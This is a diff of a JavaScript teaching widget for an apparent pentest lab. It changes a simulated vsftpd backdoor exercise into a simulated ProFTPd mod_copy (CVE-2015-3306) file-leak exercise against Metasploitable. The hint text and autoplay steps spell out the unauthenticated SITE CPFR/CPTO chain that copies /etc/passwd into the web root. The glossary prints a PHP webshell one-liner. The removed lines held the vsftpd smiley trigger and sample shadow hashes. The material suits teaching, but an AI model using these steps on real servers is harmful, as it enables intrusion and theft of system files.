@@ -2,9 +2,13 @@
  * Lab 00 — viz.js
  *
  * Widgets:
- *   1. #viz-try-it     — two-terminal vsftpd backdoor simulator
+ *   1. #viz-try-it     — two-terminal ProFTPd mod_copy simulator
+ *                        (Terminal A: nc 21 → SITE CPFR/CPTO;
+ *                         Terminal B: curl → reads the copied file)
  *   2. #viz-topology   — Kali ↔ Metasploitable network mini-diagram
- *   3. #viz-smiley     — USER-command flowchart with username picker
+ *   3. (#viz-smiley)   — removed: the §5 'mod_copy bug' explanation
+ *                        replaced the smiley flowchart with prose +
+ *                        Python sketch
  *   4. #viz-msf        — msfconsole transcript with hover-explain
  *
  * Nothing in this file touches the network or the filesystem. Both
@@ -16,7 +20,21 @@
   'use strict';
 
   const TARGET_IP = '10.0.0.6';
-  const FTP_BANNER = '220 (vsFTPd 2.3.4)';
+  const FTP_BANNER = '220 ProFTPD 1.3.5 Server (Debian) [::ffff:' + TARGET_IP + ']';
+  const WEB_ROOT  = '/var/www/html';
+
+  // The /etc/passwd content the SITE CPFR/CPTO chain leaks. Real
+  // Metasploitable 3 (Ubuntu 14.04) /etc/passwd is several dozen lines;
+  // the lab only needs a representative excerpt.
+  const ETC_PASSWD = [
+    'root:x:0:0:root:/root:/bin/bash',
+    'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
+    'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
+    'sys:x:3:3:sys:/dev:/usr/sbin/nologin',
+    'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
+    'proftpd:x:107:65534::/var/run/proftpd:/usr/sbin/nologin',
+    'vagrant:x:1000:1000::/home/vagrant:/bin/bash',
+  ];
 
   // ------------------------------------------------------------
   // SVG helper
@@ -40,14 +58,20 @@
     if (!root) return;
 
     // Per-terminal state.
-    //   mode: 'kali' | 'ftp' | 'shell'
-    //   pendingSmiley: this FTP session has sent USER ...:) (still need PASS)
+    //   mode: 'kali' | 'ftp'
+    //     'kali'  — local shell on attacker host (default for both)
+    //     'ftp'   — bytes are being sent over an open `nc` to port 21
+    //   cpfrSource: path remembered by SITE CPFR, waiting for SITE CPTO
     const TERMS = {
-      A: { mode: 'kali', pendingSmiley: false },
-      B: { mode: 'kali', pendingSmiley: false },
+      A: { mode: 'kali', cpfrSource: null },
+      B: { mode: 'kali', cpfrSource: null },
     };
-    // Shared state across the two terminals.
-    const WORLD = { backdoorArmed: false };
+    // Shared state across both terminals. webFiles records absolute
+    // paths under WEB_ROOT that the FTP daemon has written — those
+    // become reachable via curl from either terminal.
+    const WORLD = {
+      webFiles: Object.create(null),   // absolute path → file content (string)
+    };
 
     function $(id) { return document.getElementById(id); }
     function screen(t) { return $('term-' + t.toLowerCase() + '-screen'); }
@@ -58,16 +82,14 @@
       const p = prompt(t);
       const s = TERMS[t];
       p.classList.remove('ftp', 'shell', 'empty');
-      if (s.mode === 'kali')      p.textContent = 'kali@kali:~$ ';
-      else if (s.mode === 'ftp')  { p.textContent = '→ftp> '; p.classList.add('ftp'); }
-      else if (s.mode === 'shell'){ p.textContent = '# ';     p.classList.add('shell'); }
+      if (s.mode === 'kali')      p.textContent = 'kali@kali:~$ ';
+      else if (s.mode === 'ftp')  { p.textContent = '→ftp> '; p.classList.add('ftp'); }
     }
 
     function write(t, line, cls) {
       const sc = screen(t);
       const div = document.createElement('div');
       if (cls) div.className = cls;
-      // Allow multiline by replacing \n; keep <code>/<b> off — plain text only
       div.textContent = (line == null ? '' : line);
       sc.appendChild(div);
       sc.scrollTop = sc.scrollHeight;
@@ -84,6 +106,16 @@
 
     function clearScreen(t) { screen(t).innerHTML = ''; }
 
+    // ----- File-content readers (what SITE CPFR will see) ------------
+    // The daemon runs as root in default Metasploitable 3 setup, so it
+    // can read these. The copy operation produces a world-readable
+    // file at the destination, which is what makes curl-read possible.
+    const FS_READS = {
+      '/etc/passwd': ETC_PASSWD.join('\n'),
+      '/etc/issue':  'Ubuntu 14.04.5 LTS \\n \\l\n',
+      '/etc/hostname': 'metasploitable3-ub1404\n',
+    };
+
     // Recognize `nc <ip> <port>`. Allow TARGET_IP or generic placeholders.
     const NC_RE = /^nc\s+(\S+)\s+(\d+)\s*$/;
     function parseNc(cmd) {
@@ -94,22 +126,66 @@
       return { host, port, validHost: validHosts.includes(host) };
     }
 
+    // Recognize `curl http://<host>[:port]/<path>` (allow -s -L flags).
+    const CURL_RE = /^curl\s+(?:-[a-zA-Z]+\s+)*(?:'|")?(https?):\/\/([^/:'"]+)(?::(\d+))?(\/[^'"\s]*)(?:'|")?\s*$/;
+    function parseCurl(cmd) {
+      const m = cmd.match(CURL_RE);
+      if (!m) return null;
+      return {
+        scheme: m[1],
+        host:   m[2],
+        port:   m[3] ? parseInt(m[3], 10) : (m[1] === 'http' ? 80 : 443),
+        path:   m[4],
+        validHost: [TARGET_IP, '$TARGET', 'target', 'metasploitable'].includes(m[2]),
+      };
+    }
+
     function handleKali(t, cmd) {
       const trimmed = cmd.trim();
       if (!trimmed) return;
       if (trimmed === 'clear') { clearScreen(t); return; }
       if (trimmed === 'help' || trimmed === '?') {
         write(t, 'Try these:', 'term-note');
-        write(t, '  nc ' + TARGET_IP + ' 21      → connect to the FTP service', 'term-note');
-        write(t, '  nc ' + TARGET_IP + ' 6200    → connect to the (armed) backdoor', 'term-note');
-        write(t, '  clear                  → clear this screen', 'term-note');
+        write(t, '  nc ' + TARGET_IP + ' 21                     → open FTP (Terminal A)', 'term-note');
+        write(t, '  curl http://' + TARGET_IP + '/leak           → fetch a copied file (Terminal B)', 'term-note');
+        write(t, '  clear                                → clear this screen', 'term-note');
         return;
       }
-      // nmap hint
       if (/^sudo\s+nmap/.test(trimmed) || /^nmap/.test(trimmed)) {
-        write(t, '(simulated — run nmap inside the real cyber range. See section 3.)', 'term-note');
+        write(t, '(simulated — run nmap inside the real cyber range. See §3.)', 'term-note');
         return;
       }
+      // curl http://target/<path>
+      const curl = parseCurl(trimmed);
+      if (curl) {
+        if (!curl.validHost) {
+          write(t, 'curl: (6) Could not resolve host: ' + curl.host, 'term-err');
+          return;
+        }
+        if (curl.port !== 80) {
+          write(t, 'curl: (7) Failed to connect to ' + curl.host + ' port ' + curl.port + ': Connection refused', 'term-err');
+          return;
+        }
+        // Map URL path onto WEB_ROOT
+        const fsPath = WEB_ROOT + curl.path;
+        if (Object.prototype.hasOwnProperty.call(WORLD.webFiles, fsPath)) {
+          const body = WORLD.webFiles[fsPath];
+          body.split('\n').forEach(line => write(t, line));
+          updateHint('leak_read');
+        } else {
+          // 404 — emit Apache's body, mimicking what curl actually prints
+          write(t, '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">', 'term-err');
+          write(t, '<html><head>', 'term-err');
+          write(t, '<title>404 Not Found</title>', 'term-err');
+          write(t, '</head><body>', 'term-err');
+          write(t, '<h1>Not Found</h1>', 'term-err');
+          write(t, '<p>The requested URL ' + curl.path + ' was not found on this server.</p>', 'term-err');
+          write(t, '</body></html>', 'term-err');
+          updateHint('not_copied');
+        }
+        return;
+      }
+      // nc <ip> <port>
       const nc = parseNc(trimmed);
       if (nc) {
         if (!nc.validHost) {
@@ -118,22 +194,14 @@
         }
         if (nc.port === 21) {
           TERMS[t].mode = 'ftp';
-          TERMS[t].pendingSmiley = false;
+          TERMS[t].cpfrSource = null;
           setPrompt(t);
           write(t, FTP_BANNER, 'term-srv');
           updateHint('ftp_open');
           return;
         }
-        if (nc.port === 6200) {
-          if (WORLD.backdoorArmed) {
-            TERMS[t].mode = 'shell';
-            setPrompt(t);
-            write(t, '(connected — no welcome banner, no prompt. type `id` and press enter.)', 'term-note');
-            updateHint('shell_open');
-          } else {
-            write(t, '(UNKNOWN) [' + nc.host + '] 6200 (?) : Connection refused', 'term-err');
-            updateHint('not_armed');
-          }
+        if (nc.port === 80) {
+          write(t, '(this lab uses `curl`, not raw `nc`, against the web server. Try: curl http://' + TARGET_IP + '/leak)', 'term-note');
           return;
         }
         write(t, '(UNKNOWN) [' + nc.host + '] ' + nc.port + ' (?) : Connection refused', 'term-err');
@@ -146,7 +214,6 @@
       if (trimmed === 'pwd')    { write(t, '/home/kali'); return; }
       if (trimmed === 'ls')     { write(t, 'Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos'); return; }
       if (/^echo\b/.test(trimmed)) { write(t, trimmed.replace(/^echo\s*/, '')); return; }
-      // Otherwise: command not found
       const head = trimmed.split(/\s+/)[0];
       write(t, 'bash: ' + head + ': command not found', 'term-err');
     }
@@ -158,35 +225,54 @@
       if (/^quit$/i.test(trimmed) || trimmed === '^C' || trimmed === '^c') {
         write(t, '221 Goodbye.', 'term-srv');
         TERMS[t].mode = 'kali';
-        TERMS[t].pendingSmiley = false;
+        TERMS[t].cpfrSource = null;
         setPrompt(t);
         return;
       }
-      // USER ...
-      const userMatch = trimmed.match(/^USER\s+(.*)$/i);
-      if (userMatch) {
-        const arg = userMatch[1];
-        if (arg.indexOf(':)') !== -1) {
-          TERMS[t].pendingSmiley = true;
-          write(t, '331 Please specify the password.', 'term-srv');
-          write(t, '(server-side: the smiley substring was matched. The backdoor will arm when you send PASS.)', 'term-note');
-          updateHint('smiley_seen');
-        } else {
-          TERMS[t].pendingSmiley = false;
-          write(t, '331 Please specify the password.', 'term-srv');
-        }
+      // SITE CPFR <path>
+      const cpfr = trimmed.match(/^SITE\s+CPFR\s+(\S.*)$/i);
+      if (cpfr) {
+        TERMS[t].cpfrSource = cpfr[1];
+        write(t, '350 File or directory exists, ready for destination name', 'term-srv');
+        updateHint('cpfr_set');
         return;
       }
-      const passMatch = trimmed.match(/^PASS(?:\s+(.*))?$/i);
-      if (passMatch) {
-        if (TERMS[t].pendingSmiley) {
-          WORLD.backdoorArmed = true;
-          write(t, '(no reply — the backdoor has forked /bin/sh and is listening on tcp/6200.)', 'term-note');
-          write(t, '(leave this connection open. switch to the other terminal.)', 'term-note');
-          updateHint('armed');
-        } else {
-          write(t, '530 Login incorrect.', 'term-err');
+      // SITE CPTO <path>
+      const cpto = trimmed.match(/^SITE\s+CPTO\s+(\S.*)$/i);
+      if (cpto) {
+        const src = TERMS[t].cpfrSource;
+        const dest = cpto[1];
+        if (!src) {
+          // mod_copy returns 503 if CPTO arrives without a preceding CPFR
+          write(t, '503 Bad sequence of commands', 'term-err');
+          return;
         }
+        // Resolve source content with the daemon's permissions (root)
+        const body = Object.prototype.hasOwnProperty.call(FS_READS, src)
+          ? FS_READS[src]
+          : '(simulated content of ' + src + ' — the daemon can read this; the real cyber range has the live bytes.)';
+        // If the destination is inside WEB_ROOT, register it as servable.
+        if (dest.indexOf(WEB_ROOT + '/') === 0 || dest === WEB_ROOT) {
+          WORLD.webFiles[dest] = body;
+          write(t, '250 Copy successful', 'term-srv');
+          write(t, '(daemon-side: file copied with root privileges; the new file at ' + dest + ' is world-readable, so Apache (as www-data) can serve it.)', 'term-note');
+          updateHint('cpto_done');
+        } else {
+          // Still report success (mod_copy doesn't care about the path) but explain
+          write(t, '250 Copy successful', 'term-srv');
+          write(t, '(daemon-side: file copied, but ' + dest + ' is not under the web root — curl from Terminal B will not reach it. Try /var/www/html/<name>.)', 'term-note');
+        }
+        TERMS[t].cpfrSource = null;
+        return;
+      }
+      // USER / PASS — for the lab we never log in, but acknowledge politely
+      if (/^USER\s+/i.test(trimmed)) {
+        write(t, '331 Password required for ' + trimmed.replace(/^USER\s+/i, ''), 'term-srv');
+        write(t, '(note: the mod_copy bug doesn\'t care whether you log in. Skip USER/PASS and go straight to SITE CPFR.)', 'term-note');
+        return;
+      }
+      if (/^PASS\b/i.test(trimmed)) {
+        write(t, '530 Login incorrect.', 'term-err');
         return;
       }
       // Other FTP commands we don't model
@@ -199,72 +285,11 @@
       }
     }
 
-    function handleShell(t, cmd) {
-      const trimmed = cmd.trim();
-      if (!trimmed) return;
-      // exit / quit
-      if (/^(exit|logout|quit)$/i.test(trimmed)) {
-        write(t, '(connection closed.)', 'term-note');
-        TERMS[t].mode = 'kali';
-        setPrompt(t);
-        return;
-      }
-      if (trimmed === 'clear') { clearScreen(t); return; }
-      // The classic vsftpd backdoor responses — root on Metasploitable 2
-      const responses = {
-        'id': 'uid=0(root) gid=0(root) groups=0(root)',
-        'whoami': 'root',
-        'hostname': 'metasploitable',
-        'uname -a': 'Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux',
-        'uname': 'Linux',
-        'pwd': '/',
-        'ls': 'bin   dev   home  lib    media  opt   root  sbin  srv  tmp  usr  var\nboot  etc   initrd  lib32  mnt    proc  run   selinux  sys   vmlinuz',
-        'ls /': 'bin   dev   home  lib    media  opt   root  sbin  srv  tmp  usr  var\nboot  etc   initrd  lib32  mnt    proc  run   selinux  sys   vmlinuz',
-        'ls /root': 'Desktop  reset_logs.sh',
-        'ls /etc': 'apache2  hosts        nginx          passwd      shadow\ncron.d   network      nsswitch.conf  resolv.conf  ssh\nhostname pam.d        ssl',
-        'ls /home': 'msfadmin  service  user',
-        'pwd': '/',
-        'date': 'Mon Sep  4 14:22:43 UTC 2026',
-        'w': ' 14:22:43 up  0:35,  0 users,  load average: 0.00, 0.00, 0.00',
-        'ps': '  PID TTY          TIME CMD\n    1 ?        00:00:01 init\n  847 ?        00:00:00 vsftpd\n  912 ?        00:00:00 sh\n  913 ?        00:00:00 ps',
-      };
-      // Multi-line canned output for shadow + passwd
-      if (trimmed === 'cat /etc/shadow' || trimmed === 'cat shadow' || trimmed === 'less /etc/shadow') {
-        write(t, 'root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::', 'term-hl');
-        write(t, 'daemon:*:14684:0:99999:7:::');
-        write(t, 'bin:*:14684:0:99999:7:::');
-        write(t, 'sys:$1$fUX6BPOt$Miyc3Up0zQJqz4s5wFD9l0:14742:0:99999:7:::');
-        write(t, 'msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::');
-        write(t, '(yes — you can read /etc/shadow. that\'s the whole point of root.)', 'term-note');
-        return;
-      }
-      if (trimmed === 'cat /etc/passwd') {
-        write(t, 'root:x:0:0:root:/root:/bin/bash');
-        write(t, 'daemon:x:1:1:daemon:/usr/sbin:/bin/sh');
-        write(t, 'bin:x:2:2:bin:/bin:/bin/sh');
-        write(t, 'msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash');
-        write(t, 'ftp:x:107:65534::/home/ftp:/bin/false');
-        return;
-      }
-      // Look up canonicalised command
-      if (responses[trimmed] != null) {
-        const out = responses[trimmed];
-        out.split('\n').forEach(line => write(t, line));
-        return;
-      }
-      // echo, common shell builtins
-      if (/^echo\b/.test(trimmed)) { write(t, trimmed.replace(/^echo\s*/, '')); return; }
-      // Unknown command — match a real busybox-ish error
-      const head = trimmed.split(/\s+/)[0];
-      write(t, 'sh: ' + head + ': not found', 'term-err');
-    }
-
     function dispatch(t, cmd) {
       echoCmd(t, cmd);
       const mode = TERMS[t].mode;
       if (mode === 'kali')      return handleKali(t, cmd);
       if (mode === 'ftp')       return handleFtp(t, cmd);
-      if (mode === 'shell')     return handleShell(t, cmd);
     }
 
     // Hint footer copy that updates as state advances
@@ -272,11 +297,11 @@
       const hint = $('term-hint');
       if (!hint) return;
       const msgs = {
-        ftp_open:    'Now send <code>USER hacker:)</code> in Terminal A.',
-        smiley_seen: 'Smiley matched. Send any <code>PASS</code> to arm the backdoor.',
-        armed:       'Backdoor armed. Switch to Terminal B → <code>nc ' + TARGET_IP + ' 6200</code>.',
-        not_armed:   'Connection refused — you need to arm the backdoor in Terminal A first.',
-        shell_open:  'You\'re in. Try <code>id</code>, then <code>cat /etc/shadow</code>.',
+        ftp_open:    'FTP open. Send <code>SITE CPFR /etc/passwd</code> in Terminal A — no login required.',
+        cpfr_set:    '<code>350</code> — source path remembered. Now send <code>SITE CPTO /var/www/html/leak</code>.',
+        cpto_done:   '<code>250 Copy successful</code>. Switch to Terminal B → <code>curl http://' + TARGET_IP + '/leak</code>.',
+        leak_read:   'You read <code>/etc/passwd</code> without authenticating. That is the full attack primitive.',
+        not_copied: 'Apache returned <code>404</code>. The file you tried to fetch wasn\'t copied into <code>' + WEB_ROOT + '</code> yet.',
       };
       if (msgs[stage]) hint.innerHTML = 'Hint · ' + msgs[stage];
     }
@@ -291,29 +316,26 @@
         inp.value = '';
         dispatch(t, cmd);
       });
-      // Keep input focused when the terminal area is clicked
       form.parentElement.addEventListener('click', () => input(t).focus());
     });
 
     // Auto-play timer handle, shared with reset() so reset cancels it.
     let autoplayTimer = null;
 
-    // Reset everything (also stops auto-play if it's running)
     function reset() {
       if (autoplayTimer) { clearTimeout(autoplayTimer); autoplayTimer = null; }
       const btn = $('term-autoplay');
       if (btn) btn.disabled = false;
-      WORLD.backdoorArmed = false;
+      WORLD.webFiles = Object.create(null);
       ['A', 'B'].forEach(t => {
         TERMS[t].mode = 'kali';
-        TERMS[t].pendingSmiley = false;
+        TERMS[t].cpfrSource = null;
         clearScreen(t);
         setPrompt(t);
         input(t).value = '';
       });
-      write('A', '(terminal A — ready. type `nc ' + TARGET_IP + ' 21` to begin.)', 'term-note');
-      write('B', '(terminal B — ready. wait until the backdoor is armed by terminal A.)', 'term-note');
-      updateHint('ftp_open');
+      write('A', '(terminal A — ready. type `nc ' + TARGET_IP + ' 21` to open the FTP control channel.)', 'term-note');
+      write('B', '(terminal B — ready. wait until Terminal A reports `250 Copy successful`, then `curl` the copied file.)', 'term-note');
       $('term-hint').innerHTML = 'Hint · type <code>nc ' + TARGET_IP + ' 21</code> in Terminal A.';
     }
 
@@ -325,13 +347,9 @@
       btn.disabled = true;
       const steps = [
         { wait: 600,  t: 'A', cmd: 'nc ' + TARGET_IP + ' 21' },
-        { wait: 1100, t: 'A', cmd: 'USER hacker:)' },
-        { wait: 1100, t: 'A', cmd: 'PASS whatever' },
-        { wait: 1300, t: 'B', cmd: 'nc ' + TARGET_IP + ' 6200' },
-        { wait: 1100, t: 'B', cmd: 'id' },
-        { wait: 900,  t: 'B', cmd: 'whoami' },
-        { wait: 900,  t: 'B', cmd: 'hostname' },
-        { wait: 1000, t: 'B', cmd: 'cat /etc/shadow' },
+        { wait: 1200, t: 'A', cmd: 'SITE CPFR /etc/passwd' },
+        { wait: 1200, t: 'A', cmd: 'SITE CPTO /var/www/html/leak' },
+        { wait: 1500, t: 'B', cmd: 'curl http://' + TARGET_IP + '/leak' },
       ];
       let i = 0;
       function next() {
@@ -341,10 +359,8 @@
         }
         const step = steps[i++];
         autoplayTimer = setTimeout(() => {
-          // Type the command into the right input box so it visually echoes
           const inp = input(step.t);
           inp.value = step.cmd;
-          // brief pause to show the typed text, then dispatch
           setTimeout(() => {
             const cmd = inp.value;
             inp.value = '';
@@ -391,7 +407,7 @@
     el('text', { class: 'host-sub',   x: 120, y: 135 }, svg, 'attacker');
 
     el('rect', { class: 'host-box target', x: 400, y: 60, width: 160, height: 100, rx: 8 }, svg);
-    el('text', { class: 'host-label', x: 480, y: 95 }, svg, 'Metasploitable 2');
+    el('text', { class: 'host-label', x: 480, y: 95 }, svg, 'Metasploitable 3');
     el('text', { class: 'host-sub',   x: 480, y: 115 }, svg, '10.0.0.6');
     el('text', { class: 'host-sub',   x: 480, y: 135 }, svg, 'target');
 
@@ -400,21 +416,21 @@
     el('rect', { class: 'port-chip armed', x: 365, y: 78,  width: 32, height: 20, rx: 6 }, svg);
     el('text', { class: 'port-text',       x: 381, y: 90 }, svg, '21');
     el('rect', { class: 'port-chip shell', x: 365, y: 122, width: 32, height: 20, rx: 6 }, svg);
-    el('text', { class: 'port-text',       x: 381, y: 134 }, svg, '6200');
+    el('text', { class: 'port-text',       x: 381, y: 134 }, svg, '80');
 
-    // Arrow 1 — Kali → port 21 (the trigger). Ends at the chip's left edge.
+    // Arrow 1 — Kali → ProFTPd port 21 (SITE CPFR/CPTO; pre-auth).
     el('line', { class: 'arrow-line',       x1: 205, y1: 88,  x2: 362, y2: 88  }, svg);
-    el('text', { class: 'arrow-label',      x: 283,  y: 80 }, svg, 'USER hacker:)  +  PASS x');
+    el('text', { class: 'arrow-label',      x: 283,  y: 80 }, svg, 'SITE CPFR → SITE CPTO');
 
-    // Arrow 2 — Kali → port 6200 (the shell)
+    // Arrow 2 — Kali → Apache port 80 (curl the copied file)
     el('line', { class: 'arrow-line shell', x1: 205, y1: 132, x2: 362, y2: 132 }, svg);
     // Reroute the second arrow's head color via marker swap
     svg.querySelectorAll('.arrow-line.shell').forEach(l => l.setAttribute('marker-end', 'url(#topo-arrow-shell)'));
-    el('text', { class: 'arrow-label',      x: 283,  y: 152 }, svg, 'root shell · uid=0');
+    el('text', { class: 'arrow-label',      x: 283,  y: 152 }, svg, 'curl /leak · file contents');
 
     // Caption-ish labels above each arrow group
-    el('text', { class: 'arrow-label', x: 283, y: 48 }, svg, '① arm the backdoor');
-    el('text', { class: 'arrow-label', x: 283, y: 180 }, svg, '② attach to the shell');
+    el('text', { class: 'arrow-label', x: 283, y: 48 }, svg, '① copy file into web root (no auth)');
+    el('text', { class: 'arrow-label', x: 283, y: 180 }, svg, '② fetch the copied file over HTTP');
 
     // Bottom subnet label
     el('text', { class: 'host-sub', x: 300, y: 210 }, svg, 'private subnet · 10.0.0.0/24 · no internet egress');
@@ -586,9 +602,10 @@
 
     const GLOSSARY = {
       'vsftpd': {
-        title: 'vsftpd',
+        title: 'vsftpd · historical context',
         body:
-          '<p><strong>"Very Secure FTP Daemon"</strong> — a popular open-source FTP server written by Chris Evans, widely deployed on Linux servers throughout the 2000s and 2010s. It had a long reputation for being one of the more security-conscious FTP implementations, which makes the 2011 backdoor episode especially ironic: the compromise was in the distribution channel, not the code Chris wrote.</p>',
+          '<p><strong>"Very Secure FTP Daemon"</strong> — a popular open-source FTP server written by Chris Evans, widely deployed on Linux servers throughout the 2000s and 2010s. It had a long reputation for being one of the more security-conscious FTP implementations, which makes the July 2011 backdoor episode especially ironic: the compromise was in the distribution channel (the tarball server was breached and the release tarball replaced), not the code Chris wrote.</p>' +
+          '<p>The vsftpd 2.3.4 backdoor is the historical anchor for this lab; the active target as of 2026 is <strong>ProFTPd 1.3.5</strong> on Metasploitable 3. The contrast between the two — malicious code injected into a tarball vs. honest code missing an authentication check — is what §5\'s historical-context callout walks.</p>',
       },
       'tarball': {
         title: 'tarball',
@@ -653,8 +670,32 @@
       'enumeration': {
         title: 'enumeration',
         body:
-          '<p><strong>Enumeration</strong> is the recon phase of an engagement: the methodical inventory of what is running on a target, who is using it, and what versions are in play — <em>before</em> any exploit is launched. The mental loop is <em>scan → identify → version → look up</em>: find which ports answer, figure out which service is behind each port, pin down the exact version (<code>vsftpd 2.3.4</code>, not just "an FTP server"), and consult a vulnerability database to see whether that version has a known weakness.</p>' +
+          '<p><strong>Enumeration</strong> is the recon phase of an engagement: the methodical inventory of what is running on a target, who is using it, and what versions are in play — <em>before</em> any exploit is launched. The mental loop is <em>scan → identify → version → look up</em>: find which ports answer, figure out which service is behind each port, pin down the exact version (<code>ProFTPD 1.3.5</code>, not just "an FTP server"), and consult a vulnerability database to see whether that version has a known weakness.</p>' +
           '<p>Skipping enumeration is the most common rookie mistake. Without it you have no idea which exploit applies, and you waste your time firing payloads at services that aren\'t even running. Every attack in this course — and every real engagement governed by the <a href="http://www.pentest-standard.org/">PTES</a> framework — starts here.</p>',
+      },
+      'proftpd': {
+        title: 'ProFTPd',
+        body:
+          '<p><strong>ProFTPd</strong> ("Pro FTP daemon") is one of the most widely-deployed open-source FTP servers on Unix, originally written by John Morrissey in 1998. Like vsftpd, it has historically been considered a security-conscious implementation — it pioneered chroot jails for FTP, runs unprivileged after binding port 21, and supports an Apache-style modular configuration where features get added by loading optional <code>mod_*</code> modules.</p>' +
+          '<p>The 1.3.5 release shipped with <code>mod_copy</code> built but not auth-gated, leading to <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-3306">CVE-2015-3306</a> — the vulnerability you exploit in this lab. Modern ProFTPd (1.3.6+) requires authentication for the <code>SITE</code> family of commands; many production deployments also compile <code>mod_copy</code> out entirely.</p>',
+      },
+      'mod-copy': {
+        title: 'mod_copy',
+        body:
+          '<p><strong><code>mod_copy</code></strong> is an optional ProFTPd module that adds two non-standard FTP commands: <code>SITE CPFR &lt;source&gt;</code> ("copy from") and <code>SITE CPTO &lt;dest&gt;</code> ("copy to"). Together they let a logged-in user duplicate files on the server side without first downloading and re-uploading them — useful for large backups or for staging files between directories owned by the same daemon.</p>' +
+          '<p>The bug in ProFTPd 1.3.5 was that the <code>mod_copy</code> handlers ran <em>before</em> the daemon checked whether the client had authenticated. The fix in 1.3.6 was a single added guard at the top of each handler: <code>if (session.auth_required) return PR_DENIED;</code>. The lab walks the cost of that missing line.</p>',
+      },
+      'webshell': {
+        title: 'webshell',
+        body:
+          '<p>A <strong>webshell</strong> is a small script — usually one to ten lines — that lives in a web server\'s document root and, when fetched by HTTP, executes shell commands supplied through a URL parameter or POST body. The canonical PHP one-liner is <code>&lt;?php system($_GET["c"]); ?&gt;</code>: a single function call that runs whatever string is in the <code>c</code> query parameter and prints the output.</p>' +
+          '<p>Webshells are the standard "initial-access ↦ persistent foothold" bridge in real intrusions. Once an attacker has any kind of file-write primitive on a web server, dropping a webshell is usually step one — it converts the bug into a stable HTTP-driven command channel that survives across reboots, evades most IDSs (HTTP traffic is unremarkable), and can be invoked from any browser. Defenders look for webshells with file-integrity monitoring (a new <code>.php</code> file in a directory that doesn\'t normally change) and with HTTP-log analysis (suspicious query-string patterns to .php files that don\'t belong to the site\'s real codebase).</p>',
+      },
+      'www-data': {
+        title: 'www-data',
+        body:
+          '<p><strong><code>www-data</code></strong> is the unprivileged user account that Apache (and most other web servers) runs as on Debian/Ubuntu systems. It exists specifically so the web server doesn\'t need <code>root</code> for its day-to-day work: serving static files, reading PHP scripts, talking to upstream databases. UID 33 by convention. The <code>www-data</code> account typically has no login shell, no home directory worth visiting, and read-only access to the web root.</p>' +
+          '<p>When a webshell exploit lands, the resulting shell runs as <code>www-data</code> — not as <code>root</code>. <code>www-data</code> can run any command on the box, but it cannot read <code>/etc/shadow</code>, bind privileged ports, or modify system configuration. Getting from <code>www-data</code> to <code>root</code> is a separate phase called <strong>privilege escalation</strong>, covered in detail in <a href="../lab-10/pentest.html">Lab 10</a>.</p>',
       },
       'banner': {
         title: 'banner',
